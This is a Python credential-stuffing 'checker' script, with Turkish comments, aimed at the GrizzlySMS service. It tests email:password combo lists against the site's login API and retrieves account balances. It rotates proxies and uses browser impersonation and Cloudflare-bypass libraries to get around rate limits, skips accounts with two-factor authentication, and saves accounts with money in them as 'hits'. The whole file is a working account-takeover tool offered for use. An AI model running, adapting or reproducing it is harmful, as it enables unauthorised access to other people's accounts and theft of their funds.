#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GrizzlySMS - Terminal Checker
- Dosya formati: email:sifre (her satir 1 hesap)
- Sadece email formatindakiler denenir, digerleri atlanir
- POST /api/users/login -> token
- GET  /api/sms-users/balance -> bakiye
- 2FA olanlar es gecilir
- Sadece bakiyesi >0 olanlar kaydedilir
- Site donusu (raw JSON) terminalde gosterilir, gereksiz yazi yok

Kullanim:
  pip install requests
  python grizzly_checker.py hesaplar.txt
  python grizzly_checker.py hesaplar.txt --threads 10 --timeout 15 --output hits.txt
"""

import re
import sys
import json
import time
import random
import string
import argparse
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
try:
    from curl_cffi import requests as creq
    HAS_CURL = True
except:
    HAS_CURL = False
    creq = None

try:
    import cloudscraper
    _scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False})
    HAS_CLOUDSCRAPER = True
except:
    HAS_CLOUDSCRAPER = False
    _scraper = None

LOGIN_URL = "https://grizzlysms.com/api/users/login"
BALANCE_URL = "https://grizzlysms.com/api/sms-users/balance"
DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"

def http_post(url, **kwargs):
    if HAS_CURL:
        kwargs.setdefault("impersonate", "chrome120")
        return creq.post(url, **kwargs)
    if HAS_CLOUDSCRAPER:
        return _scraper.post(url, **kwargs)
    return requests.post(url, **kwargs)

def http_get(url, **kwargs):
    if HAS_CURL:
        kwargs.setdefault("impersonate", "chrome120")
        return creq.get(url, **kwargs)
    if HAS_CLOUDSCRAPER:
        return _scraper.get(url, **kwargs)
    return requests.get(url, **kwargs)

def remove_account_from_file(filepath, email, password):
    """Kontrol edilen hesabi dosyadan sil"""
    try:
        lines = filepath.read_text(encoding="utf-8", errors="ignore").splitlines()
        new_lines = []
        removed = False
        for line in lines:
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                new_lines.append(line)
                continue
            # email:sifre formatini kontrol et
            if email.lower() in stripped.lower() and password in stripped:
                removed = True
                continue
            new_lines.append(line)
        if removed:
            filepath.write_text("\n".join(new_lines) + "\n" if new_lines else "", encoding="utf-8")
    except:
        pass

EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")

def is_valid_email(s: str) -> bool:
    return bool(EMAIL_RE.match(s.strip().strip('"').strip("'").strip()))

_proxy_optifine = Path(__file__).resolve().parent / "Webshare 100 proxies.txt"
if _proxy_optifine.exists():
    DEFAULT_PROXY_FILE = _proxy_optifine
else:
    DEFAULT_PROXY_FILE = Path(r"C:\Users\batuh\Downloads\Webshare 100 proxies.txt")

def parse_proxy_line(line: str):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    # Webshare formati: p.webshare.io:80:cxogwxac-1:bnppj4tedhn5
    if line.startswith("http://") or line.startswith("https://"):
        return line
    parts = line.split(":")
    if len(parts) == 4:
        host, port, user, pw = parts
        return f"http://{user}:{pw}@{host}:{port}"
    if len(parts) == 3:
        # ip:port:user:pass? zaten 4 olmali ama
        return None
    if "@" in line and ":" in line:
        if not line.startswith("http"):
            return "http://" + line
        return line
    if ":" in line:
        # ip:port
        return "http://" + line
    return None

def load_proxies(path: Path):
    if not path or not path.exists():
        return []
    proxies = []
    try:
        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
            p = parse_proxy_line(line)
            if p:
                proxies.append(p)
    except:
        pass
    return proxies

def gen_session_token() -> str:
    return "frnt" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=9))

def generate_headers(with_auth=None):
    h = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://grizzlysms.com",
        "referer": "https://grizzlysms.com/authorization",
        "user-agent": DEFAULT_UA,
        "x-session-token": gen_session_token(),
        "x-user-locale": "en",
        "x-forwarded-host": "grizzlysms.com",
    }
    if with_auth:
        h["authorization"] = f"Bearer {with_auth}"
    return h

def find_jwt_in_obj(obj):
    if isinstance(obj, str):
        if obj.count(".") == 2 and len(obj) > 50 and obj.startswith("eyJ"):
            return obj
        return None
    if isinstance(obj, dict):
        for key in ["authToken", "accessToken", "token", "jwt", "bearer", "access_token"]:
            if key in obj and isinstance(obj[key], str) and obj[key].count(".") == 2:
                return obj[key]
            if key in obj and isinstance(obj[key], str) and len(obj[key]) > 30:
                if obj[key] not in ("false", "true", "", None) and ("." in obj[key] or len(obj[key]) > 80):
                    return obj[key]
        for v in obj.values():
            r = find_jwt_in_obj(v)
            if r:
                return r
    elif isinstance(obj, list):
        for item in obj:
            r = find_jwt_in_obj(item)
            if r:
                return r
    return None

def find_balance_in_obj(obj):
    # direkt numeric
    if isinstance(obj, (int, float)):
        return float(obj)
    if isinstance(obj, dict):
        candidates = []
        for key in ["balance", "amount", "funds", "credit", "money", "bonusBalance", "availableBalance"]:
            if key in obj:
                candidates.append(obj[key])
        for k in ["data", "result", "response", "user", "profile"]:
            if k in obj and isinstance(obj[k], dict):
                inner = find_balance_in_obj(obj[k])
                if inner is not None:
                    return inner
        for c in candidates:
            try:
                if isinstance(c, (int, float)):
                    return float(c)
                if isinstance(c, str):
                    m = re.search(r"([0-9]+[.,][0-9]+|[0-9]+)", c.replace(",", "."))
                    if m:
                        return float(m.group(1))
            except:
                pass
        for v in obj.values():
            if isinstance(v, dict):
                r = find_balance_in_obj(v)
                if r is not None:
                    return r
            elif isinstance(v, (int, float)):
                # bazen balance direk value olmayabilir ama yine de dene
                pass
        return None
    elif isinstance(obj, str):
        s = obj.strip()
        # plain numeric "0.63"
        try:
            # tam numeric string mi?
            if re.fullmatch(r"[0-9]+[.,]?[0-9]*", s):
                return float(s.replace(",", "."))
        except:
            pass
        if "ACCESS_BALANCE" in obj:
            m = re.search(r"ACCESS_BALANCE:([0-9.]+)", obj)
            if m:
                try:
                    return float(m.group(1))
                except:
                    pass
        m = re.search(r"([0-9]+[.,][0-9]+|[0-9]+)", obj)
        if m:
            try:
                return float(m.group(1).replace(",", "."))
            except:
                pass
    elif isinstance(obj, list) and len(obj) > 0:
        for item in obj:
            r = find_balance_in_obj(item)
            if r is not None:
                return r
    return None

def parse_combos(filepath: Path):
    combos = []
    skipped = 0
    text = filepath.read_text(encoding="utf-8", errors="ignore").lstrip("\ufeff")
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if '"password"' in line.lower() and line.count('"') > 3:
            skipped += 1
            continue
        sep = None
        for cand in [":", ";", "|", ","]:
            if cand in line:
                sep = cand
                break
        if sep:
            parts = line.split(sep, 1)
        else:
            parts = line.split(None, 1)
            if len(parts) < 2:
                skipped += 1
                continue
        email = parts[0].strip().strip('"').strip("'").strip(",").strip()
        pwd = parts[1].strip().strip('"').strip("'").strip().lstrip(":").strip()
        if not email or not pwd:
            skipped += 1
            continue
        if not is_valid_email(email):
            skipped += 1
            continue
        if pwd.lower() == "can'tdecode" or "can'tdecode" in pwd.lower():
            skipped += 1
            continue
        combos.append((email, pwd))
    return combos, skipped

def check_account(email, password, timeout, proxy=None):
    # proxy dict
    proxies = {"http": proxy, "https": proxy} if proxy else None
    # login - 429 / cloudflare icin 3 kere retry (proxy yoksa)
    login_code = 0
    login_body = None
    login_raw = ""
    resp = None
    for attempt in range(3):
        try:
            if proxies:
                resp = http_post(LOGIN_URL, json={"username": email, "password": password}, headers=generate_headers(), timeout=timeout, proxies=proxies)
            else:
                resp = http_post(LOGIN_URL, json={"username": email, "password": password}, headers=generate_headers(), timeout=timeout)
        except Exception as e:
            # proxy hatasi - disarida retry edilsin diye error dondur
            return {"email": email, "password": password, "status": "error", "login_code": 0, "login_body": f"proxy/timeout {e}", "balance": None, "proxy": proxy}

        login_code = resp.status_code
        # cloudflare html tespiti
        body_text = resp.text
        is_cf = login_code in (403, 429) and ("Just a moment" in body_text or "cloudflare" in body_text.lower() or "<title>Just a moment" in body_text)
        if is_cf:
            login_code = 429  # rate_limit olarak isle
            login_body = body_text
            login_raw = body_text[:500]
            if not proxy and attempt < 2:
                wait = 15 + attempt * 10  # 15s, 25s
                time.sleep(wait)
                continue
            else:
                break
        if login_code == 429:
            try:
                login_body = resp.json()
                login_raw = json.dumps(login_body, ensure_ascii=False)
            except:
                login_body = resp.text
                login_raw = resp.text[:500]
            if not proxy and attempt < 2:
                wait = 12 + attempt * 8
                time.sleep(wait)
                continue
            else:
                break

        # normal response
        try:
            login_body = resp.json()
            login_raw = json.dumps(login_body, ensure_ascii=False)
        except:
            login_body = resp.text
            login_raw = resp.text[:500]
        break

    # 2FA
    if isinstance(login_body, dict) and login_body.get("need_two_factor") is True:
        return {"email": email, "password": password, "status": "2fa", "login_code": login_code, "login_body": login_raw, "balance": None}

    if isinstance(login_body, list):
        for item in login_body:
            if isinstance(item, dict) and item.get("field") == "password":
                return {"email": email, "password": password, "status": "invalid", "login_code": login_code, "login_body": login_raw, "balance": None}

    if login_code == 422:
        return {"email": email, "password": password, "status": "invalid", "login_code": login_code, "login_body": login_raw, "balance": None}

    if login_code == 429:
        return {"email": email, "password": password, "status": "rate_limit", "login_code": login_code, "login_body": login_raw, "balance": None}

    if login_code == 200:
        if isinstance(login_body, dict) and login_body.get("token") is False and login_body.get("need_two_factor"):
            return {"email": email, "password": password, "status": "2fa", "login_code": login_code, "login_body": login_raw, "balance": None}
        token = find_jwt_in_obj(login_body)
        if not token:
            try:
                for c in resp.cookies:
                    if "authToken" in c.name or "token" in c.name.lower():
                        if c.value and len(c.value) > 50:
                            token = c.value
                            break
            except:
                pass
        if not token:
            return {"email": email, "password": password, "status": "error", "login_code": login_code, "login_body": login_raw, "balance": None}

        # balance
        try:
            if proxies:
                b_resp = http_get(BALANCE_URL, headers=generate_headers(with_auth=token), timeout=timeout, proxies=proxies)
            else:
                b_resp = http_get(BALANCE_URL, headers=generate_headers(with_auth=token), timeout=timeout)
        except Exception as e:
            return {"email": email, "password": password, "status": "error", "login_code": login_code, "login_body": login_raw, "balance_body": str(e), "balance": None, "proxy": proxy}

        balance_code = b_resp.status_code
        try:
            b_body = b_resp.json()
            b_raw = json.dumps(b_body, ensure_ascii=False)
        except:
            b_body = b_resp.text
            b_raw = b_resp.text[:500]

        bal = find_balance_in_obj(b_body)
        if bal is None:
            try:
                m = re.search(r'"balance"\s*:\s*"?([0-9.]+)"?', b_resp.text)
                if m:
                    bal = float(m.group(1))
            except:
                pass

        if bal is None:
            bal = 0.0

        currency = "USD"
        try:
            if isinstance(b_body, dict) and isinstance(b_body.get("currency"), str):
                currency = b_body.get("currency")
        except:
            pass

        if bal > 0:
            return {"email": email, "password": password, "status": "hit", "login_code": login_code, "login_body": login_raw, "balance_code": balance_code, "balance_body": b_raw, "balance": bal, "currency": currency}
        else:
            return {"email": email, "password": password, "status": "no_balance", "login_code": login_code, "login_body": login_raw, "balance_code": balance_code, "balance_body": b_raw, "balance": bal, "currency": currency}

    return {"email": email, "password": password, "status": "error", "login_code": login_code, "login_body": login_raw, "balance": None}


def find_auto_file():
    script_dir = Path(__file__).resolve().parent
    search_dirs = [script_dir, Path.cwd(), Path.home() / "Downloads", Path.home() / "Desktop"]
    # oncelikli dosya adlari
    preferred_names = ["hesaplar.txt", "accounts.txt", "combo.txt", "combos.txt", "grizzly.txt", "liste.txt", "hesap.txt"]
    for d in search_dirs:
        for name in preferred_names:
            p = d / name
            if p.is_file():
                try:
                    t = p.read_text(encoding="utf-8", errors="ignore")[:2000]
                    if "@" in t and ":" in t:
                        return p
                except:
                    continue
    # genel .txt tarama en cok email iceren
    best = None
    best_score = 0
    for d in search_dirs:
        if not d.exists():
            continue
        for p in d.glob("*.txt"):
            if p.name.lower() in ("hits_bakiyeli.txt", "hits.txt"):
                continue
            try:
                txt = p.read_text(encoding="utf-8", errors="ignore")
                score = txt.count("@")
                if score > best_score and ":" in txt and score >= 2:
                    best_score = score
                    best = p
            except:
                continue
    return best

def main():
    parser = argparse.ArgumentParser(description="GrizzlySMS Terminal Checker - sadece bakiyeli hesaplar kaydedilir")
    parser.add_argument("file", nargs="?", default=None, help="hesap dosyasi yolu (email:sifre her satir) - verilmezse otomatik arar")
    parser.add_argument("--threads", type=int, default=1, help="es zamanli istek sayisi (default 1 - sira sira)")
    parser.add_argument("--timeout", type=int, default=15, help="timeout saniye (default 15)")
    parser.add_argument("--delay", type=float, default=3.0, help="islemler arasi bekleme saniye (default 3.0)")
    parser.add_argument("--output", type=str, default="bakiyeli-hesaplar.txt", help="bakiyeli hesaplar cikti dosyasi")
    args = parser.parse_args()

    if not args.file:
        auto = find_auto_file()
        if auto:
            args.file = str(auto)
        else:
            print("dosya bulunamadi. Kullanim: python grizzly_checker.py hesaplar.txt")
            sys.exit(1)

    fp = Path(args.file)
    if not fp.exists():
        print(f"dosya bulunamadi: {fp}")
        sys.exit(1)

    combos, skipped = parse_combos(fp)

    if not combos:
        sys.exit(0)

    script_dir = Path(__file__).resolve().parent
    out_path = Path(args.output)
    if not out_path.is_absolute():
        out_path = script_dir / out_path
    out_path.parent.mkdir(parents=True, exist_ok=True)
    if not out_path.exists():
        out_path.write_text(f"# hits bakiyeli - {fp.name}\n", encoding="utf-8")

    counters = {"hit": 0, "twofa": 0, "invalid": 0, "no_balance": 0, "error": 0}

    # proxy yukle - otomatik Webshare dosyasi
    proxies = load_proxies(DEFAULT_PROXY_FILE)
    proxy_idx = 0
    import threading
    proxy_lock = threading.Lock()

    def get_next_proxy():
        nonlocal proxy_idx
        with proxy_lock:
            if not proxies:
                return None
            p = proxies[proxy_idx % len(proxies)]
            proxy_idx += 1
            return p

    def check_with_proxy_retry(email, pwd, timeout):
        last_res = None
        for attempt in range(2):
            proxy = get_next_proxy()
            res = check_account(email, pwd, timeout, proxy=proxy)
            status = res.get("status")
            body = res.get("login_body", "")
            is_retryable = False
            if status == "rate_limit":
                is_retryable = True
            elif status == "error" and ("proxy" in body.lower() or "timeout" in body.lower() or "timed out" in body.lower() or "failed to connect" in body.lower() or "connection" in body.lower()):
                is_retryable = True
            elif res.get("login_code") in (403, 429) and "Just a moment" in body:
                is_retryable = True
            if is_retryable and attempt == 0 and proxies:
                time.sleep(1.5)
                last_res = res
                continue
            return res
        return last_res

    def process_one(idx, email, pwd):
        res = check_with_proxy_retry(email, pwd, args.timeout)
        status = res["status"]
        print(f"[{idx}/{len(combos)}] {email}:{pwd}")
        print(f"  login {res.get('login_code')} -> {res.get('login_body')}")
        if "balance_code" in res:
            print(f"  balance {res.get('balance_code')} -> {res.get('balance_body')}")
        if status == "hit":
            counters["hit"] += 1
            bal = res.get("balance")
            curr = res.get("currency", "USD")
            print(f"  -> HIT bakiye {bal:.2f} {curr}")
            with open(out_path, "a", encoding="utf-8") as f:
                f.write(f"{email}:{pwd} | {bal:.2f} {curr}\n")
        elif status == "no_balance":
            counters["no_balance"] += 1
            print(f"  -> no_balance bakiye {res.get('balance')}")
        elif status == "2fa":
            counters["twofa"] += 1
            print(f"  -> 2fa")
        elif status == "invalid":
            counters["invalid"] += 1
            print(f"  -> invalid")
        elif status == "rate_limit":
            counters["error"] += 1
            print(f"  -> rate_limit (15s bekleniyor)")
            sys.stdout.flush()
            time.sleep(10)
        else:
            counters["error"] += 1
            print(f"  -> error")
        remove_account_from_file(fp, email, pwd)
        print()
        sys.stdout.flush()
        return res

    if args.threads <= 1:
        try:
            for i, (e, p) in enumerate(combos, 1):
                process_one(i, e, p)
                if i < len(combos) and args.delay > 0:
                    time.sleep(args.delay)
        except KeyboardInterrupt:
            print("\ndurduruldu")
            sys.exit(1)
    else:
        lock = threading.Lock()
        def worker(idx, email, pwd):
            res = check_with_proxy_retry(email, pwd, args.timeout)
            status = res["status"]
            with lock:
                print(f"[{idx}/{len(combos)}] {email}:{pwd}")
                print(f"  login {res.get('login_code')} -> {res.get('login_body')}")
                if "balance_code" in res:
                    print(f"  balance {res.get('balance_code')} -> {res.get('balance_body')}")
                if status == "hit":
                    counters["hit"] += 1
                    bal = res.get("balance")
                    curr = res.get("currency", "USD")
                    print(f"  -> HIT bakiye {bal:.2f} {curr}")
                    with open(out_path, "a", encoding="utf-8") as f:
                        f.write(f"{email}:{pwd} | {bal:.2f} {curr}\n")
                elif status == "no_balance":
                    counters["no_balance"] += 1
                    print(f"  -> no_balance bakiye {res.get('balance')}")
                elif status == "2fa":
                    counters["twofa"] += 1
                    print(f"  -> 2fa")
                elif status == "invalid":
                    counters["invalid"] += 1
                    print(f"  -> invalid")
                elif status == "rate_limit":
                    counters["error"] += 1
                    print(f"  -> rate_limit (10s bekleniyor)")
                    sys.stdout.flush()
                    time.sleep(10)
                else:
                    counters["error"] += 1
                    print(f"  -> error")
                remove_account_from_file(fp, email, pwd)
                print()
                sys.stdout.flush()
            if args.delay > 0:
                time.sleep(args.delay)
            return res

        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = {ex.submit(worker, i+1, e, p): (e, p) for i, (e, p) in enumerate(combos)}
            try:
                for fut in as_completed(futures):
                    pass
            except KeyboardInterrupt:
                print("\ndurduruldu")
                ex.shutdown(wait=False, cancel_futures=True)
                sys.exit(1)

    # sessiz bitis, sadece hit varsa dosya yolu
    if counters["hit"] > 0:
        print(f"bitti {counters['hit']} bakiyeli kaydedildi -> {out_path}")

if __name__ == "__main__":
    main()
